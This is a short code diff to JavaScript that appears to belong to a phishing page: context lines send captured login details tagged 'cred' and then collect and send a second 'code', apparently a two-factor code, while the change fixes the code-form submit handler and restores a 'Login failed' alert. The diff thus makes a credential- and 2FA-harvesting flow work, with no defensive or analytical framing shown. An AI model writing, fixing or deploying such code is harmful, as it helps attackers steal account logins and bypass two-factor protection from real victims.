@@ -173,7 +173,7 @@
     sendData(message, 'cred');
   });
   
-  $("#loginForm").submit((e) => {
+  $("#codeForm").submit((e) => {
     e.preventDefault();
     const code = $("#code").val();
     const message = `Code: ${code}`;
@@ -199,7 +199,7 @@
           $("#loginForm").hide();
           $("#codeForm").show();
         } else {
-          // alert("Login failed, please try again!");
+          alert("Login failed, please try again!");
         }
       })
       .catch((err) => {
